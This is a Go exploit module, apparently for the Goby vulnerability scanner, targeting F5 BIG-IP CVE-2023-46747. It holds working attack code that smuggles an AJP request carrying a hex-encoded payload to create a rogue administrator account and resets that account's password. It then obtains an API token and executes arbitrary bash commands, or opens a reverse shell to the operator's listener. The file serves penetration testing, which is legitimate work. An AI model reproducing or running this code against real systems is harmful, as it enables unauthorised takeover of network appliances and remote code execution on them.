package exploits

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "F5 BIG-IP AJP authentication bypass vulnerability (CVE-2023-46747)",
    "Description": "<p>F5 BIG-IP is a high-performance application delivery controller (ADC) that provides load balancing, application security, application acceleration, and application intelligence.</p><p>There is a certain problem when F5 BIG-IP forwards the AJP protocol through Apache httpd, which results in request smuggling and bypassing permission verification. An attacker can exploit this vulnerability with background injection to execute arbitrary code and gain server permissions.</p>",
    "Product": "f5-BIGIP",
    "Homepage": "https://www.f5.com.cn/",
    "DisclosureDate": "2023-10-25",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"F5_PWS\" || title=\"BIG-IP\" || body=\"logoutActivexContainer\"",
    "GobyQuery": "body=\"F5_PWS\" || title=\"BIG-IP\" || body=\"logoutActivexContainer\"",
    "Level": "3",
    "Impact": "<p>There is a certain problem when F5 BIG-IP forwards the AJP protocol through Apache httpd, which results in request smuggling and bypassing permission verification. An attacker can exploit this vulnerability with background injection to execute arbitrary code and gain server permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a security patch, please keep an eye on the updates: <a href=\"https://my.f5.com/manage/s/article/K000137353\">https://my.f5.com/manage/s/article/K000137353</a></p>",
    "References": [
        "https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-46747"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "F5 BIG-IP AJP 身份认证绕过漏洞（CVE-2023-46747）",
            "Product": "f5-BIGIP",
            "Description": "<p>F5 BIG-IP 是一种高性能的应用交付控制器（ADC），用于提供负载均衡、应用安全、应用加速和应用智能等功能。</p><p>F5 BIG-IP 通过 Apache httpd 转发 AJP 协议时存在一定问题，导致可以请求走私，绕过权限验证。攻击者可通过利用该漏洞配合后台注入，执行任意代码，获取服务器权限。</p>",
            "Recommendation": "<p>厂商已发布安全补丁，请及时关注更新：<a href=\"https://my.f5.com/manage/s/article/K000137353\">https://my.f5.com/manage/s/article/K000137353</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">F5 BIG-IP 通过 Apache httpd 转发 AJP 协议时存在一定问题，导致可以请求走私，绕过权限验证。攻击者可通过利用该漏洞配合后台注入，执行任意代码，获取服务器权限。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "F5 BIG-IP AJP authentication bypass vulnerability (CVE-2023-46747)",
            "Product": "f5-BIGIP",
            "Description": "<p>F5 BIG-IP is a high-performance application delivery controller (ADC) that provides load balancing, application security, application acceleration, and application intelligence.</p><p>There is a certain problem when F5 BIG-IP forwards the AJP protocol through Apache httpd, which results in request smuggling and bypassing permission verification. An attacker can exploit this vulnerability with background injection to execute arbitrary code and gain server permissions.</p>",
            "Recommendation": "<p>The manufacturer has released a security patch, please keep an eye on the updates: <a href=\"https://my.f5.com/manage/s/article/K000137353\">https://my.f5.com/manage/s/article/K000137353</a><br></p>",
            "Impact": "<p>There is a certain problem when F5 BIG-IP forwards the AJP protocol through Apache httpd, which results in request smuggling and bypassing permission verification. An attacker can exploit this vulnerability with background injection to execute arbitrary code and gain server permissions.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-30",
    "PocId": "10862"
}`

	registerUser := func(hostInfo *httpclient.FixUrl, username, password string) bool {
		usernameHex := hex.EncodeToString([]byte(username))
		passwordHex := hex.EncodeToString([]byte(password))
		conn, err := httpclient.GetTCPConn(hostInfo.HostInfo)
		if err != nil {
			return false
		}
		conn = tls.Client(conn, &tls.Config{
			MinVersion:         tls.VersionTLS10,
			InsecureSkipVerify: true, // 忽略证书验证
		})
		defer conn.Close()
		messageData := "POST /tmui/login.jsp HTTP/1.1\r\n"
		messageData += fmt.Sprintf("Host: %s\r\n", hostInfo.HostInfo)
		messageData += "Transfer-Encoding: chunked, chunked\r\n"
		messageData += "Content-Type:  application/x-www-form-urlencoded\r\n"
		messageData += "\r\n"
		dataHex, _ := hex.DecodeString("0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d" + usernameHex + "266e616d655f6265666f72653d267061737377643d" + passwordHex + "267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff00")
		messageData += "204\r\n" + string(dataHex) + "\r\n0\r\n\r\n"
		_, err = conn.Write([]byte(messageData))
		buf := make([]byte, 40960)
		responseString := ""
		for {
			count, err := conn.Read(buf)
			tmpMessageData := string(buf[0:count])
			responseString += tmpMessageData
			if err != nil {
				break
			}
		}
		return strings.Contains(responseString, "200 OK")
	}

	getNewPasswordDKQWOERI := func(hostInfo *httpclient.FixUrl, username, password, newPassword string) bool {
		patchRequestConfig := httpclient.NewRequestConfig("PATCH", "/mgmt/tm/auth/user/"+username)
		patchRequestConfig.VerifyTls = false
		patchRequestConfig.Timeout = 120
		patchRequestConfig.Header.Store("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(username+":"+password)))
		patchRequestConfig.Header.Store("Content-Type", "application/json")
		patchRequestConfig.Data = fmt.Sprintf("{\"password\": \"" + newPassword + "\"}")
		response, err := httpclient.DoHttpRequest(hostInfo, patchRequestConfig)
		return err == nil && response != nil && response.StatusCode == 200
	}

	getTokenDJQIOPUR := func(hostInfo *httpclient.FixUrl, username, newPassword string) string {
		postRequestConfig := httpclient.NewPostRequestConfig(fmt.Sprintf("/mgmt/shared/authn/login"))
		postRequestConfig.VerifyTls = false
		postRequestConfig.Timeout = 120
		postRequestConfig.Header.Store("Content-Type", "application/json")
		postRequestConfig.Data = fmt.Sprintf("{\"username\":\"" + username + "\", \"password\":\"" + newPassword + "\"}")
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err == nil && strings.Contains(response.Utf8Html, "token") {
			results := regexp.MustCompile(`token":"([A-Z0-9]{26})"`).FindStringSubmatch(response.Utf8Html)
			if len(results) > 1 {
				return results[1]
			}
		}
		return ""
	}

	executeCommandDKPQWOZXCJOP := func(hostInfo *httpclient.FixUrl, token, cmd string) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig(fmt.Sprintf("/mgmt/tm/util/bash"))
		postRequestConfig.VerifyTls = false
		postRequestConfig.Timeout = 120
		postRequestConfig.Header.Store("X-F5-Auth-Token", token)
		postRequestConfig.Header.Store("Content-Type", "application/json")
		postRequestConfig.Data = fmt.Sprintf("{\"command\":\"run\",\"utilCmdArgs\":\"-c " + fmt.Sprintf("'echo -n $`%s`'", strings.ReplaceAll(strings.ReplaceAll(cmd, "'", "\\'"), `"`, `\"`)) + "\"}")
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		} else if strings.Contains(response.Utf8Html, "commandResult") {
			results := regexp.MustCompile(`"commandResult":"(.*?)"}`).FindStringSubmatch(response.Utf8Html)
			if len(results) > 1 {
				return results[1][1:], nil
			}
		}
		return "", errors.New("漏洞利用失败")
	}

	accountLoginQMOQWIJUER := func(hostInfo *httpclient.FixUrl) string {
		var loginUsername, loginPassword string
		oldPassword := goutils.RandomHexString(12)
		for _, s := range []string{"AZWKL:AAF31FaF60f68f", goutils.RandomHexString(5) + ":AAF31FaF60f68f"} {
			splitResult := strings.Split(s, ":")
			username := splitResult[0]
			password := splitResult[1]
			if !registerUser(hostInfo, username, oldPassword) || getNewPasswordDKQWOERI(hostInfo, username, oldPassword, password) {
				loginUsername = username
				loginPassword = password
				break
			}
		}
		if loginUsername == "" {
			return ""
		}
		token := getTokenDJQIOPUR(hostInfo, loginUsername, loginPassword)
		if len(token) > 0 {
			return token
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			token := accountLoginQMOQWIJUER(hostInfo)
			if len(token) > 0 {
				checkString := goutils.RandomHexString(6)
				responseBody, _ := executeCommandDKPQWOZXCJOP(hostInfo, token, "echo "+checkString)
				return strings.Contains(responseBody, checkString)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(singleScanConfig.Params["attackType"])
			token := accountLoginQMOQWIJUER(expResult.HostInfo)
			if attackType == "cmd" {
				cmd := goutils.B2S(singleScanConfig.Params["cmd"])
				if result, err := executeCommandDKPQWOZXCJOP(expResult.HostInfo, token, cmd); err != nil {
					expResult.Output = err.Error()
				} else if len(result) > 0 {
					expResult.Success = true
					expResult.Output = result
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = err.Error()
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					executeCommandDKPQWOZXCJOP(expResult.HostInfo, token, cmd)
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
						expResult.Output = `漏洞利用失败`
						expResult.Success = false
					}
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
